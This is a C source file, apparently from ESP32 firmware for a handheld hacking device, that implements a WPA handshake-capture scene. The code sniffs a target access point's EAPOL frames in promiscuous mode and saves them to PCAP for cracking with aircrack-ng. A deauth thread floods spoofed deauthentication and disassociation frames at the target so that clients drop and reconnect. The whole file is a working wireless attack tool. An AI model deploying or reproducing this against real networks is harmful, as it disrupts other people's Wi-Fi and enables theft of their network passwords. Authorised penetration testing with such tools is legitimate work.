#include "../wifi_app.h"
#include "../wifi_hal.h"
#include "../wifi_pcap.h"
#include "../wifi_handshake_parser.h"
#include "../views/handshake_view.h"

#include <esp_wifi.h>
#include <esp_log.h>
#include <esp_timer.h>
#include <storage/storage.h>
#include <string.h>

#define TAG WIFI_APP_LOG_TAG

// ---------------------------------------------------------------------------
// Ring buffer for captured packets (single producer, single consumer)
// ---------------------------------------------------------------------------
#define HS_PKT_POOL_SIZE 32
#define HS_PKT_MAX_LEN  512

typedef struct {
    uint16_t len;
    uint32_t timestamp_us;
    uint8_t data[HS_PKT_MAX_LEN];
} HsPkt;

static HsPkt* s_pkt_pool = NULL; // dynamically allocated to save ~16KB BSS
static volatile uint32_t s_hs_write_idx = 0;
static volatile uint32_t s_hs_read_idx = 0;

// ---------------------------------------------------------------------------
// Handshake capture state (single target AP)
// ---------------------------------------------------------------------------
typedef struct {
    uint8_t bssid[6];
    uint8_t station_mac[6];
    uint8_t ap_mac[6];

    bool has_beacon;
    bool has_m1;
    bool has_m2;
    bool has_m3;
    bool has_m4;
} HandshakeCapture;

static HandshakeCapture s_capture;
static File* s_hs_pcap_file = NULL;
static Storage* s_hs_storage = NULL;
static uint32_t s_hs_start_time = 0;

// ---------------------------------------------------------------------------
// Deauth thread (reuses pattern from scene_deauther.c)
// ---------------------------------------------------------------------------
static const uint8_t deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};
static const uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};

static uint8_t s_hs_frame_deauth[26];
static uint8_t s_hs_frame_disassoc[26];
static FuriThread* s_hs_deauth_thread = NULL;

static int32_t hs_deauth_thread_fn(void* arg) {
    WifiApp* app = arg;
    uint32_t cycle = 0;
    ESP_LOGI(TAG, "Handshake deauth thread started");

    while(app->handshake_deauth_running) {
        uint8_t reason = reasons[cycle % 5];
        s_hs_frame_deauth[24] = reason;
        s_hs_frame_disassoc[24] = reason;

        if(wifi_hal_send_raw(s_hs_frame_deauth, 26)) app->handshake_deauth_count++;
        if(wifi_hal_send_raw(s_hs_frame_disassoc, 26)) app->handshake_deauth_count++;
        cycle++;
        furi_delay_ms(5);
    }

    ESP_LOGI(TAG, "Handshake deauth thread stopped, %lu frames",
             (unsigned long)app->handshake_deauth_count);
    return 0;
}

/**
 * Process a single packet: check if it's a beacon or EAPOL for our target,
 * update s_capture state accordingly.
 * Returns the EAPOL message number (1-4) if an EAPOL was stored, 0 otherwise.
 */
static uint8_t hs_process_packet(const uint8_t* payload, int len) {
    if(len < 24) return 0;

    // Beacon for our target?
    if(hs_is_beacon(payload, len)) {
        const uint8_t* bssid = &payload[16];
        if(memcmp(bssid, s_capture.bssid, 6) == 0) {
            if(!s_capture.has_beacon) {
                s_capture.has_beacon = true;
                ESP_LOGI(TAG, "Beacon captured for target");
            }
        }
        return 0;
    }

    // Data frame?
    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frame_type = (fc & 0x0C) >> 2;
    if(frame_type != 2) return 0;

    // Parse addresses
    const uint8_t* bssid = NULL;
    const uint8_t* station = NULL;
    const uint8_t* ap = NULL;
    int header_len = 0;
    if(!hs_parse_addresses(payload, len, &bssid, &station, &ap, &header_len)) return 0;

    // Only care about our target BSSID
    if(memcmp(bssid, s_capture.bssid, 6) != 0) return 0;

    // EAPOL check
    if(!hs_is_eapol(payload, header_len, len)) return 0;

    const uint8_t* llc = &payload[header_len];
    const uint8_t* eapol_start = &llc[8];
    int eapol_len = len - header_len - 8;

    uint8_t msg_num = hs_get_eapol_msg_num(eapol_start, eapol_len);
    if(msg_num == 0) return 0;

    ESP_LOGI(TAG, "EAPOL M%d captured (%d bytes)", msg_num, len);

    // Store station/AP MACs
    memcpy(s_capture.station_mac, station, 6);
    memcpy(s_capture.ap_mac, ap, 6);

    switch(msg_num) {
    case 1:
        if(!s_capture.has_m1) {
            s_capture.has_m1 = true;
            ESP_LOGI(TAG, "Stored M1");
        }
        break;
    case 2:
        if(!s_capture.has_m2) {
            s_capture.has_m2 = true;
            ESP_LOGI(TAG, "Stored M2");
        }
        break;
    case 3:
        if(!s_capture.has_m3) {
            s_capture.has_m3 = true;
            ESP_LOGI(TAG, "Stored M3");
        }
        break;
    case 4:
        if(!s_capture.has_m4) {
            s_capture.has_m4 = true;
            ESP_LOGI(TAG, "Stored M4");
        }
        break;
    }

    return msg_num;
}

/** Handshake is complete when we have M2+M3 (minimum for cracking) */
static bool hs_is_complete(void) {
    return s_capture.has_m2 && s_capture.has_m3;
}

// ---------------------------------------------------------------------------
// Promiscuous callback — pre-filters for target beacon + EAPOL only
// ---------------------------------------------------------------------------
static void hs_rx_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    UNUSED(type);
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if(len < 24 || len > HS_PKT_MAX_LEN) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frame_type = (fc & 0x0C) >> 2;
    uint8_t frame_subtype = (fc & 0xF0) >> 4;

    // Beacon from our target BSSID?
    if(frame_type == 0 && frame_subtype == 8) {
        if(memcmp(&payload[16], s_capture.bssid, 6) != 0) return;
        // Fall through to enqueue
    }
    // Data frame — quick EAPOL pre-filter
    else if(frame_type == 2) {
        int hdr_len = 24;
        uint8_t to_ds = (fc & 0x0100) >> 8;
        uint8_t from_ds = (fc & 0x0200) >> 9;
        if(to_ds && from_ds) hdr_len = 30;
        if((frame_subtype & 0x08) == 0x08) hdr_len += 2;
        if(len < hdr_len + 8) return;
        const uint8_t* llc = &payload[hdr_len];
        if(!(llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E)) return;
        // Fall through to enqueue
    }
    else {
        return;
    }

    // Ring buffer enqueue
    uint32_t next = (s_hs_write_idx + 1) % HS_PKT_POOL_SIZE;
    if(next == s_hs_read_idx) return; // full, drop

    HsPkt* slot = &s_pkt_pool[s_hs_write_idx];
    memcpy(slot->data, payload, len);
    slot->len = len;
    slot->timestamp_us = pkt->rx_ctrl.timestamp;
    s_hs_write_idx = next;
}

// ---------------------------------------------------------------------------
// Drain ring buffer, process packets, write to PCAP
// ---------------------------------------------------------------------------
static void hs_drain_and_process(WifiApp* app) {
    while(s_hs_read_idx != s_hs_write_idx) {
        HsPkt* pkt = &s_pkt_pool[s_hs_read_idx];

        uint8_t msg = hs_process_packet(pkt->data, pkt->len);
        if(msg > 0) {
            app->handshake_eapol_count++;
        }

        // Write every beacon/EAPOL to PCAP (aircrack-ng needs them all)
        if(s_hs_pcap_file) {
            wifi_pcap_write_packet(s_hs_pcap_file, pkt->timestamp_us, pkt->data, pkt->len);
        }

        s_hs_read_idx = (s_hs_read_idx + 1) % HS_PKT_POOL_SIZE;
    }
}

// ---------------------------------------------------------------------------
// SSID sanitization for filename
// ---------------------------------------------------------------------------
static void hs_sanitize_ssid(const char* ssid, const uint8_t* bssid, char* out, size_t out_len) {
    if(ssid[0] == '\0') {
        // Hidden SSID — use BSSID hex
        snprintf(out, out_len, "%02X%02X%02X%02X%02X%02X",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        return;
    }

    size_t j = 0;
    for(size_t i = 0; ssid[i] && j < out_len - 1; i++) {
        char c = ssid[i];
        if((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
}

// ---------------------------------------------------------------------------
// Scene handlers
// ---------------------------------------------------------------------------

void wifi_app_scene_handshake_on_enter(void* context) {
    WifiApp* app = context;

    app->handshake_running = false;
    app->handshake_deauth_running = false;
    app->handshake_eapol_count = 0;
    app->handshake_deauth_count = 0;
    app->handshake_complete = false;
    s_hs_write_idx = 0;
    s_hs_read_idx = 0;
    memset(&s_capture, 0, sizeof(s_capture));

    // Allocate ring buffer dynamically (avoid ~16KB permanent BSS usage)
    if(!s_pkt_pool) {
        s_pkt_pool = malloc(sizeof(HsPkt) * HS_PKT_POOL_SIZE);
    }

    // Start WiFi
    if(!wifi_hal_is_started()) {
        wifi_hal_start();
    }

    // Disconnect WiFi if connected (promiscuous mode requires it)
    if(wifi_hal_is_connected()) {
        wifi_hal_disconnect();
        ESP_LOGI(TAG, "Disconnected WiFi for handshake capture");
    }

    // Use connected AP info as target
    WifiApRecord* target = NULL;
    if(app->connected_ap.ssid[0] != '\0') {
        target = &app->connected_ap;
    } else if(app->selected_index < app->ap_count) {
        // Fallback for direct scanner->handshake flow
        target = &app->ap_records[app->selected_index];
    }

    if(target) {
        memcpy(s_capture.bssid, target->bssid, 6);
        wifi_hal_set_channel(target->channel);

        // Build deauth frames for target
        memcpy(s_hs_frame_deauth, deauth_tmpl, 26);
        memcpy(&s_hs_frame_deauth[10], target->bssid, 6);
        memcpy(&s_hs_frame_deauth[16], target->bssid, 6);
        memcpy(s_hs_frame_disassoc, s_hs_frame_deauth, 26);
        s_hs_frame_disassoc[0] = 0xa0; // disassoc subtype
    }

    // Enable promiscuous (needed for channel set to work properly)
    wifi_hal_set_promiscuous(true, NULL);

    // Open PCAP file
    s_hs_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_hs_storage, "/ext/wifi");
    storage_common_mkdir(s_hs_storage, "/ext/wifi/handshakes");

    char safe_ssid[64];
    hs_sanitize_ssid(target ? target->ssid : "", target ? target->bssid : s_capture.bssid,
                     safe_ssid, sizeof(safe_ssid));

    char path[128];
    // Find next available file (avoid overwriting)
    snprintf(path, sizeof(path), "/ext/wifi/handshakes/%s.pcap", safe_ssid);
    if(!storage_common_stat(s_hs_storage, path, NULL)) {
        // File exists, find next number
        for(int i = 1; i < 999; i++) {
            snprintf(path, sizeof(path), "/ext/wifi/handshakes/%s_%d.pcap", safe_ssid, i);
            if(storage_common_stat(s_hs_storage, path, NULL)) {
                break; // file doesn't exist, use this
            }
        }
    }
    s_hs_pcap_file = wifi_pcap_open(s_hs_storage, path);

    // Init view
    HandshakeViewModel* model = view_get_model(app->view_handshake);
    if(target) {
        strncpy(model->ssid, target->ssid, 32);
        model->ssid[32] = '\0';
        if(model->ssid[0] == '\0') strcpy(model->ssid, "(hidden)");
        memcpy(model->bssid, target->bssid, 6);
        model->channel = target->channel;
    } else {
        strcpy(model->ssid, "No target");
        memset(model->bssid, 0, 6);
        model->channel = 0;
    }
    model->running = false;
    model->deauth_active = false;
    model->has_beacon = false;
    model->has_m1 = false;
    model->has_m2 = false;
    model->has_m3 = false;
    model->has_m4 = false;
    model->complete = false;
    model->eapol_count = 0;
    model->deauth_frames = 0;
    model->elapsed_sec = 0;
    view_commit_model(app->view_handshake, true);

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiAppViewHandshake);
}

bool wifi_app_scene_handshake_on_event(void* context, SceneManagerEvent event) {
    WifiApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == InputKeyOk) {
            if(!app->handshake_running && !app->handshake_complete) {
                // Start capture
                app->handshake_running = true;
                s_hs_start_time = (uint32_t)(esp_timer_get_time() / 1000000);
                wifi_hal_set_promiscuous(true, hs_rx_callback);
                ESP_LOGI(TAG, "Handshake capture started");
            } else if(app->handshake_running) {
                // Stop capture
                app->handshake_running = false;
                wifi_hal_set_promiscuous(false, NULL);
                hs_drain_and_process(app);
                ESP_LOGI(TAG, "Handshake capture stopped");
            }
            consumed = true;
        } else if(event.event == InputKeyUp && app->handshake_running) {
            if(!app->handshake_deauth_running) {
                // Start deauth
                app->handshake_deauth_running = true;
                app->handshake_deauth_count = 0;
                s_hs_deauth_thread = furi_thread_alloc();
                furi_thread_set_name(s_hs_deauth_thread, "HsDeauth");
                furi_thread_set_stack_size(s_hs_deauth_thread, 2048);
                furi_thread_set_context(s_hs_deauth_thread, app);
                furi_thread_set_callback(s_hs_deauth_thread, hs_deauth_thread_fn);
                furi_thread_start(s_hs_deauth_thread);
                ESP_LOGI(TAG, "Handshake deauth started");
            } else {
                // Stop deauth
                app->handshake_deauth_running = false;
                if(s_hs_deauth_thread) {
                    furi_thread_join(s_hs_deauth_thread);
                    furi_thread_free(s_hs_deauth_thread);
                    s_hs_deauth_thread = NULL;
                }
                ESP_LOGI(TAG, "Handshake deauth stopped");
            }
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        if(app->handshake_running) {
            hs_drain_and_process(app);

            // Check completion
            if(hs_is_complete() && !app->handshake_complete) {
                app->handshake_complete = true;
                app->handshake_running = false;
                wifi_hal_set_promiscuous(false, NULL);

                // Stop deauth if running
                if(app->handshake_deauth_running) {
                    app->handshake_deauth_running = false;
                    if(s_hs_deauth_thread) {
                        furi_thread_join(s_hs_deauth_thread);
                        furi_thread_free(s_hs_deauth_thread);
                        s_hs_deauth_thread = NULL;
                    }
                }

                // Flush and close PCAP
                hs_drain_and_process(app);
                if(s_hs_pcap_file) {
                    wifi_pcap_close(s_hs_pcap_file);
                    s_hs_pcap_file = NULL;
                }

                ESP_LOGI(TAG, "*** HANDSHAKE COMPLETE! M1=%d M2=%d M3=%d M4=%d B=%d ***",
                         s_capture.has_m1, s_capture.has_m2, s_capture.has_m3,
                         s_capture.has_m4, s_capture.has_beacon);
            }
        }

        // Update view model
        HandshakeViewModel* model = view_get_model(app->view_handshake);
        model->running = app->handshake_running;
        model->deauth_active = app->handshake_deauth_running;
        model->has_beacon = s_capture.has_beacon;
        model->has_m1 = s_capture.has_m1;
        model->has_m2 = s_capture.has_m2;
        model->has_m3 = s_capture.has_m3;
        model->has_m4 = s_capture.has_m4;
        model->complete = app->handshake_complete;
        model->eapol_count = app->handshake_eapol_count;
        model->deauth_frames = app->handshake_deauth_count;
        if(app->handshake_running) {
            model->elapsed_sec = (uint32_t)(esp_timer_get_time() / 1000000) - s_hs_start_time;
        }
        view_commit_model(app->view_handshake, true);
    }

    return consumed;
}

void wifi_app_scene_handshake_on_exit(void* context) {
    WifiApp* app = context;

    // Stop deauth thread
    if(app->handshake_deauth_running) {
        app->handshake_deauth_running = false;
        if(s_hs_deauth_thread) {
            furi_thread_join(s_hs_deauth_thread);
            furi_thread_free(s_hs_deauth_thread);
            s_hs_deauth_thread = NULL;
        }
    }

    // Stop capture
    if(app->handshake_running) {
        app->handshake_running = false;
        wifi_hal_set_promiscuous(false, NULL);
        hs_drain_and_process(app);
    } else {
        wifi_hal_set_promiscuous(false, NULL);
    }

    // Close PCAP
    if(s_hs_pcap_file) {
        wifi_pcap_close(s_hs_pcap_file);
        s_hs_pcap_file = NULL;
    }
    if(s_hs_storage) {
        furi_record_close(RECORD_STORAGE);
        s_hs_storage = NULL;
    }

    // Free ring buffer
    if(s_pkt_pool) {
        free(s_pkt_pool);
        s_pkt_pool = NULL;
    }
}
